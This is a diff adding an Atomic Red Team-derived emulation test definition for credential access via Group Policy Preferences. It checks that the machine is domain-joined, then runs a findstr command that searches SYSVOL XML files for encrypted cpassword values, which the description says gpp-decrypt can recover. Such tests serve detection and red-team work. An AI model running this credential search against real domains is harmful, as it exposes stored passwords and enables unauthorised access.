@@ -1,0 +1,40 @@
+# Converted from Atomic Red Team - Unsecured Credentials: Group Policy Preferences
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1552.006
+# Original auto_generated_guid: 870fe8fb-5e23-4f5f-b89d-dd7fe26f3b5f
+
+---
+api_version: 2.0
+uuid: 0afb7a78-472a-4f19-b9b4-640dfb7dffd9
+name: GPP Passwords (findstr)
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.
+
+mitre:
+  tactics:
+    - TA0006 Credential Access
+  techniques:
+    - T1552 Unsecured Credentials
+  subtechniques:
+    - T1552.006 Group Policy Preferences
+
+requirements:
+  platforms:
+    - os: windows
+  superuser: false
+
+steps:
+  - name: check_domain_joined
+    executor: powershell
+    inline: |
+      if (-not (Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {
+        Write-Error "Computer must be domain joined. Joining this computer to a domain must be done manually. Exiting..."
+        exit 1
+      }
+
+  - name: search_gpp_passwords
+    executor: cmd.exe
+    inline: |
+      findstr /S cpassword %logonserver%\sysvol\*.xml
